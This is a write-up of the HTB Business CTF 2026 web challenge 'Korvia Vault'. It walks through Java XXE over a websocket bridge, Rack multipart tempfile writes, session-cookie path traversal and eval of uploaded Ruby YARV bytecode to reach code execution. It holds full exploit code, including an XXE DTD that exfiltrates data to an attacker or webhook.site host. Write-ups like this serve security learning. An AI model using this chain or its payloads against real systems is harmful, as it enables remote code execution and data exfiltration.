---
title: "Web - Korvia Vault - HTB Business CTF 2026 Project Nightfall"
date: "2026-05-22"
excerpt: "Writeup of the insane web challenge Korvia Vault from HTB Business CTF 2026"
tags:
  - web
  - ruby
  - xxe
  - rack
  - yarv
author: "Ap4sh"
---

## Overview

Korvia Vault was an insane web challenge from Hackthebox Business CTF 2026.

The app looked like a small monitoring console, the chain was a very funny mix of Ruby internals, Java XXE, and Rack multipart tempfiles. It also looks like there was multiple way to solve the challenge and grab the flag, and I can't be sure that I did the intended way. Anyway;

TL;DR:

```text
register/login
-> authenticated /ws-bridge
-> Java XXE on the internal websocket service
-> leak /tmp and optionally /opt/external-app/users.json
-> upload Ruby YARV bytecode as a multipart file
-> Rack drops it as /tmp/RackMultipart...bin
-> session cookie path traversal points to that tempfile
-> RubyVM::InstructionSequence.load_from_binary(...).eval
-> /usr/local/bin/readflag
```

The "hardest" part is that the challenge doesn't have an upload feature, the write primitive comes from Rack itself, which was a super interesting thing to discover!

There was also an HTTPS service on `127.0.0.1:8080` and a weird `ref` parser that could lead into raw localhost sockets. I spent time looking at it, but I did not need it for the final chain..

---

## 1. Source layout

The provided source has three important pieces:

```text
external-app/          Sinatra app exposed through nginx
internal-app/          Java app with a localhost websocket server
readflag/readflag.c    SUID helper reading /root/flag_*.txt
```

The container entrypoint randomizes the real flag filename:

```bash
mv /root/flag.txt "/root/flag_${RANDOM_SUFFIX}.txt"
chmod 600 "/root/flag_${RANDOM_SUFFIX}.txt"
```

So the intended end goal is not a static file read. We need to execute:

```text
/usr/local/bin/readflag
```

The helper is tiny:

```c
int main(void) {
    char flag[256] = {0};
    glob_t globbuf;

    if (glob("/root/flag_*.txt", 0, NULL, &globbuf) != 0 || globbuf.gl_pathc == 0) {
        return 1;
    }

    FILE* fp = fopen(globbuf.gl_pathv[0], "r");
    globfree(&globbuf);

    if (!fp) {
        return 1;
    }

    fread(flag, 1, 256, fp);
    puts(flag);
    fclose(fp);
    return 0;
}
```

Classic CTF moment: if a SUID helper exists, the web chain probably wants code execution as the app user, then call the helper.

---

## 2. Ruby sessions are bytecode

The Sinatra app does not store sessions as JSON, Marshal, or signed cookies. It literally compiles Ruby source to YARV bytecode and writes the binary to disk. And on every authenticated route, it loads the cookie-selected file back with `load_from_binary(...).eval`:

![Session load_from_binary sink](/static/img/posts/2026-htb-business-web-korvia-vault/session-load.webp)

Two huge problems:

1. `session_id` is controlled by the cookie.
2. `File.join(settings.sessions_dir, session_id)` does not stop path traversal.

So this cookie path:

```text
session=../../../../tmp/RackMultipartXXXX.bin|signature
```

will make the app load:

```text
/tmp/RackMultipartXXXX.bin
```

instead of:

```text
/opt/external-app/sessions/<session id>
```

Ruby's own docs are also pretty clear that `load_from_binary` is not a format you should accept from other people. The binary is version specific and the loader has no verifier. Perfect CTF material.

There is one more check after the bytecode runs:

```ruby
user = find_user_by_username(session_data[:username])

unless verify_signature(session_data[:username], parsed[:signature], user['secret'])
  redirect '/login'
end
```

The signature is:

```ruby
OpenSSL::HMAC.hexdigest('SHA256', secret, username)
```

This means our malicious bytecode must return a `username` for which we can provide a valid HMAC.

For the clean path, this is easy:

- Register a user.
- Login normally.
- Keep the HMAC already present in the valid session cookie.
- Build malicious bytecode that returns the same username.

No need to know the secret in that clean flow.

In my remote run, I also used XXE to leak `users.json`, because I ended up reusing a surviving tempfile from an older attempt and wanted to recompute the HMAC. That made the final replay stable, but it is not the only way.

---

## 3. The authenticated websocket bridge

The dashboard talks to `/ws-bridge`.

```js
const ws = new WebSocket('ws://' + window.location.hostname + ':' + window.location.port + '/ws-bridge');
```

Server side, this endpoint verifies the normal session and then proxies websocket frames to a localhost backend:

```ruby
get '/ws-bridge' do
  session_cookie = request.cookies['session']
  halt 401, 'Unauthorized' if session_cookie.nil? || session_cookie.empty?

  parsed = parse_session_cookie(session_cookie)
  halt 401, 'Unauthorized' if parsed.nil?

  session_data = load_session(parsed[:session_id])
  halt 401, 'Unauthorized' if session_data.nil?

  user = find_user_by_username(session_data[:username])
  halt 401, 'Unauthorized' if user.nil?

  unless verify_signature(session_data[:username], parsed[:signature], user['secret'])
    halt 401, 'Unauthorized'
  end

  if request.env['HTTP_UPGRADE']&.downcase == 'websocket'
    port = 3000

    backend_ref = params['ref']
    parsed_port = parse_backend_ref(backend_ref)
    port = parsed_port if parsed_port

    backend = TCPSocket.new('127.0.0.1', port)
    ...
  end
end
```

The default backend is:

```text
127.0.0.1:3000
```

which is the Java websocket server.

There is a rabbit hole around `parse_backend_ref`:

![Backend ref parser](/static/img/posts/2026-htb-business-web-korvia-vault/backend-ref-parser.webp)

At first glance, `slice(-1, 1)` should return at most one character, so `suffix.length <= 1` looks like dead code. Apparently there are fun Ruby encoding edge cases around long strings, but this was not needed for my final chain. The normal port `3000` is enough.

(Thanks a lot to Knorrke for showing me this, it actually gives a real primitive to open a raw tcp socket to a port by sending an upgrade request with like `ref=1234aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%80` - [https://nastystereo.com/security/ruby-slice.html](https://nastystereo.com/security/ruby-slice.html) - but this was not usefull here.)

---

## 4. XXE in the internal Java service

The Java websocket server has an action called `process_xml`.

```java
case "process_xml":
    String base64Xml = json.getString("xml");
    processXml(conn, base64Xml);
    break;
```

The XML parser is built with default `DocumentBuilderFactory` settings. Then the custom resolver allows `http://` and `file://` system IDs:

![Java XXE resolver](/static/img/posts/2026-htb-business-web-korvia-vault/java-xxe-resolver.webp)

So we get blind XXE with local file read and OOB HTTP callbacks.

The standard external DTD shape:

```xml
<!ENTITY % file SYSTEM "file:///tmp/">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/leak?x=%file;'>">
%eval;
%exfil;
```

and the XML sent through the websocket:

```xml
<?xml version="1.0"?>
<!DOCTYPE x [
  <!ENTITY % remote SYSTEM "http://ATTACKER/dtd">
  %remote;
]>
<x/>
```

`file:///tmp/` is the funny bit. Java's file URL handler can return a directory listing for a directory path, so the OOB callback gives filenames from `/tmp`.

Locally, after dropping one Rack tempfile, the callback looked like this:

```text
{"status":"ok"}
/dtd?1779479365760870589
/leak?x=RackMultipart20260522-120-z9s4fz.bin
```

![XXE tmp listing callback](/static/img/posts/2026-htb-business-web-korvia-vault/xxe-tmp-listing.webp)
![XXE RackMultipart leak](/static/img/posts/2026-htb-business-web-korvia-vault/xxe-rackmultipart-leak.webp)

On remote, if `/tmp` had multiple files, the listing contained line breaks and some normal webhook parsers did not show the exfil cleanly. A dumb raw HTTP listener was better because it showed the request even when the URL was ugly.

---

## 5. The file write that is NOT an upload feature

At this point we have:

- A path traversal into `load_from_binary(...).eval`.
- XXE to list `/tmp`.
- No obvious way to write a file.

The missing piece is Rack multipart parsing.

Rack creates a tempfile for every multipart part with a filename. In the challenge container, Rack 2.2.23 had:

```ruby
TEMPFILE_FACTORY = lambda { |filename, content_type|
  extension = ::File.extname(filename.gsub("\0", '%00'))[0, 129]

  Tempfile.new(["RackMultipart", extension])
}
```

This creates files named like:

```text
/tmp/RackMultipart20260522-120-z9s4fz.bin
```

The app does not need an upload endpoint. Any route that touches `params` can trigger multipart parsing. `/login` does:

```ruby
post '/login' do
  username = params[:username]
  password = params[:password]
  ...
end
```

So we can send:

```text
POST /login
Content-Type: multipart/form-data

username=bad
password=bad
blob=@evil.bin
```

and Rack will parse `blob` into a tempfile before the app rejects the bad login.

I verified the behavior locally:

```text
before single count 0 []
single status 200 1319
after single count 1 ['/tmp/RackMultipart20260522-120-fc927q.bin']
```

![Rack tempfile created locally](/static/img/posts/2026-htb-business-web-korvia-vault/rack-tempfile-local.webp)

Thanks Rack for the free tempfile write :p

However, these files are temporary. Depending on the Rack stack, object lifetime, and GC, they can disappear quickly. The exploit should do:

```text
upload bytecode -> list /tmp -> hit /profile
```

as fast as possible.

---

## 6. Building a malicious session file

The malicious file must be Ruby instruction sequence binary for the same Ruby version and architecture as the target. Ruby's own docs mention that the binary is not portable across versions, so I generated it with the challenge Docker image.

The Ruby source we want to compile is just a fake session hash:

```ruby
{
  username: "OURUSER",
  session_id: "x",
  created_at: `/usr/local/bin/readflag`,
  valid: true
}
```

The backticks run the SUID helper. The result is stored in `created_at`.

Why `created_at`? Because `/profile` renders it:

![Profile rendering created_at](/static/img/posts/2026-htb-business-web-korvia-vault/profile-created-at.webp)

Generator:

```python
import subprocess

RUBY_IMAGE = "korvia-vault-local"
username = "OURUSER"

code = (
    '{ username: "'
    + username
    + '", session_id: "x", created_at: `/usr/local/bin/readflag`, valid: true }'
)
ruby = (
    "code=%r; STDOUT.binmode; "
    "STDOUT.write RubyVM::InstructionSequence.compile(code).to_binary"
) % code

payload = subprocess.check_output(
    ["docker", "run", "--rm", "--entrypoint", "ruby", RUBY_IMAGE, "-e", ruby]
)
open("evil.bin", "wb").write(payload)
```

The resulting `evil.bin` is then uploaded as a multipart file.

---

## 7. Clean exploit flow

The clean version of the exploit is:

1. Register a random alphanumeric username.
2. Login and keep the session cookie signature.
3. Generate YARV bytecode for that same username.
4. Send it as a multipart file to `/login`.
5. Use `/ws-bridge` and XXE to list `/tmp`.
6. Extract the new `RackMultipart...bin` filename.
7. Replace the session id in the cookie with `../../../../tmp/<that file>`.
8. Reuse the HMAC signature from step 2.
9. Request `/profile`.

Cookie shape:

```text
session=../../../../tmp/RackMultipart20260522-120-z9s4fz.bin|<valid_hmac_for_username>
```

The app then does:

```text
File.binread("/opt/external-app/sessions/../../../../tmp/RackMultipart...")
-> RubyVM::InstructionSequence.load_from_binary(...)
-> eval
-> created_at = output of /usr/local/bin/readflag
-> profile prints the flag
```

Local solve getting:

```text
upload 200 384
tmp RackMultipart20260522-120-z9s4fz.bin
profile 200
['HTB{f4k3_fl4g_f0r_t3st1ng}']
```

We're good to go!

---

## 8. What happened on remote

The remote was a bit annoying because tempfiles were actually temporary. I had a first good leak, then lost the file before the final `/profile` request.

The recovery path was:

- Use a raw HTTP listener for XXE callbacks, because `/tmp` listings with multiple entries can put newlines into the exfil URL.
- Use XXE to leak `/opt/external-app/users.json`.
- Find the user for the still-existing bytecode tempfile.
- Recompute the HMAC.
- Replay the cookie with the surviving tempfile.

The final values were:

```text
tmp file: RackMultipart20260515-65-a7el0j.bin
username: u1778852537818840362
secret: 91f765fcd7d95f7c87e5acba64f5ce672a41c270fa589513bc2314f115246ef0
```

So:

```python
hmac_sha256(secret, username)
```

gave a valid signature for the forged session.

And we can now grab the flag on the remote.

```python
import hmac, hashlib, re, requests

base = 'http://154.57.164.80:31700'
username = 'u1778852537818840362'
secret = '91f765fcd7d95f7c87e5acba64f5ce672a41c270fa589513bc2314f115246ef0'
tmp_name = 'RackMultipart20260515-65-a7el0j.bin'

sig = hmac.new(secret.encode(), username.encode(), hashlib.sha256).hexdigest()
cookie = {'session': '../../../../tmp/' + tmp_name + '|' + sig}
r = requests.get(base + '/profile', cookies=cookie)
print(r.text)
```

## Final solve

```python
import base64, json, re, sys, time
from urllib.parse import unquote

import requests, websocket


base = sys.argv[1].rstrip("/")
placeholder = b"U0000000000000000000"
template = b"WUFSQgMAAAACAAAAfAEAAAAAAAABAAAACwAAAMQAAABQAQAAeDg2XzY0LWxpbnV4LWdudQAnBSsHJwkrCycNJScPZycRJxNDEXkDAwMDAQEDCwEDCQEDEwEDEQEDGwEDGQEDIQEDAP//////////AQEFBQUFBQsFBQUAAAAAAAAVKQMBAQEtoSsBAQEBAQEBAXcBAwMDAyMDAQPTdysVCwELAP//////////AQD//////////wsDAQEBAQEBAxEBAQAAAIUAAADxCQAARQUVPGNvbXBpbGVkPgAAABQFEXVzZXJuYW1lAEUDKVUwMDAwMDAwMDAwMDAwMDAwMDAwABQFFXNlc3Npb25faWQAAABFAwN4FAUVY3JlYXRlZF9hdAAAAEUDLy91c3IvbG9jYWwvYmluL3JlYWRmbGFnAAAUBQt2YWxpZPIpAAAUBQNgyAAAAMwAAADcAAAA6AAAAAABAAAQAQAAFAEAACQBAABAAQAASAEAAEwBAAA="

token = requests.post("https://webhook.site/token", json={"default_content": "x", "default_content_type": "application/xml", "expiry": 3600}).json()["uuid"]
hook = "http://webhook.site/" + token
dtd = f"""<!ENTITY % file SYSTEM "file:///tmp/">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{hook}/leak?x=%file;'>">
%eval;
%exfil;"""
requests.put("https://webhook.site/token/" + token, json={"default_content": dtd, "default_content_type": "application/xml", "expiry": 3600})

session = requests.Session()
username = "u" + str(time.time_ns())
password = "p"
payload = base64.b64decode(template).replace(placeholder, username.encode())

session.post(base + "/register", data={"username": username, "password": password}, allow_redirects=False)
session.post(base + "/login", data={"username": username, "password": password}, allow_redirects=False)
signature = unquote(session.cookies["session"]).split("|", 1)[1]
session.post(base + "/login", data={"username": "bad", "password": "bad"}, files={"blob": ("evil.bin", payload, "application/octet-stream")}, allow_redirects=False)

cookie = "; ".join(f"{k}={v}" for k, v in session.cookies.items())
ws = websocket.create_connection(base.replace("http", "ws") + "/ws-bridge", header=[f"Cookie: {cookie}", "Origin: " + base])
xml = f'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % remote SYSTEM "{hook}?{time.time_ns()}">%remote;]><x/>'
ws.send(json.dumps({"action": "process_xml", "xml": base64.b64encode(xml.encode()).decode()}))
time.sleep(2)
ws.close()

requests_seen = requests.get("https://webhook.site/token/" + token + "/requests", params={"sorting": "newest", "per_page": 50}).json()["data"]
urls = "\n".join(unquote(r["url"]) for r in requests_seen)
tmp_name = re.findall(r"RackMultipart[^\s&<>]+\.bin", urls)[-1]

forged = {"session": "../../../../tmp/" + tmp_name + "|" + signature}
r = requests.get(base + "/profile", cookies=forged)
print(r.text)
```


Much love 💋

Ap4sh
